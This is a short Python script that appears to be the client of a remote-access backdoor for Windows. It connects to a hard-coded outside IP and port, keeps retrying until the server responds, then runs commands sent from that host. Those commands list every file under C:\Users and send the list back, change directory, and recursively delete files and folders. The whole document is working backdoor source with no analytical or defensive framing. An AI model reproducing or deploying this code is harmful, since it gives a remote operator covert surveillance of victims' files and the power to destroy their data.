#!/usr/bin/python
# -*- coding: UTF-8 -*
#pip install pypiwin32
import os
import socket
import time

path = r"C:\Users"


def list_all_path():
	global path
	all_list = []
	for root , dirs, files in os.walk(path):
		for x in files:
			z = root + "\\" + x
			all_list.append(z)

	all_list = str(all_list)
	return all_list


def remove_dir(dir):
	#用于删除路径的函数
	dir = dir.replace('\\', '/')
	if(os.path.isdir(dir)):
		for p in os.listdir(dir):
			remove_dir(os.path.join(dir,p))
		if(os.path.exists(dir)):
			os.rmdir(dir)
	else:
		if(os.path.exists(dir)):
			os.remove(dir)


def linux_to_os(cmd):

	global path

	re = "none"
	cmd = cmd.split(' ')

	if cmd[0] == "ls":
		re = str(os.listdir(path))

	elif cmd[0] == "lsa":
		re = list_all_path()

	elif cmd[0] == "cdi":
		path = path + "\\" + cmd[1]

	elif cmd[0] == "cdq":

		list_p = path.split("\\")
		wz = len(list_p) - 1
		del list_p[wz]

		path = "\\".join(list_p)

	elif cmd[0] == "rmr":

		remove_dir(cmd[1])


	elif cmd[0] == "rm":

		os.remove(cmd[1])
		

	return re


def main():

	global path

	while True:
		sock = socket.socket()
		HOST = "34.80.135.251"
		PORT = 2233
		sock.connect((HOST, PORT))
		#发送模式
		sock.sendall("hello".encode())
		server = sock.recv(1024).decode()

		if server != "stop":
			break
		else:
			sock.close()
			time.sleep(10)

	sock.sendall("hello".encode())

	while True:
		re = sock.recv(1024).decode()
		over = linux_to_os(re)
		sock.sendall(over.encode())

		

if __name__=='__main__':
	main()


